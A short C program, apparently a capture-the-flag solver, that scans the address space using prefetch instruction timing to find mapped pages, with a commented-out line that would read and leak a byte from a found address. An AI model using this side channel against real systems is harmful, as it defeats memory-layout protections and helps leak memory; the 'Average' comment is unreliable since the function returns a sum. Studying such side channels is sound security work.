#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <unistd.h>

int measure_prefetch(void *ptr) {
    uint64_t start, end;
    int sum = 0;
    
    // Multiple measurements for accuracy
    for (int i = 0; i < 10; i++) {
        start = __rdtsc();
        _mm_mfence();
        _mm_prefetch(ptr, _MM_HINT_T2);
        _mm_mfence();
        end = __rdtsc();
        sum += (end - start);
    }
    return sum;  // Average
}

int main() {
    // Search for pages with low prefetch timing
	for (uint64_t addr = 0x10000; addr < 0x100000000; addr += 0x1000) {
		int timing = measure_prefetch((void*)addr);

	// Adjust threshold based on your system
		if (timing < 730) {  
			printf("Low timing at %p: %d cycles\n", (void*)addr, timing);
		    
		    // Try to read from this address (might segfault)
		    // In the real challenge, you'd exit with the byte value
		    // exit(*(char*)addr);  // Uncomment for actual challenge
		}
	}
	char buf[20];
	scanf("%1s", buf);
	return 0;
}
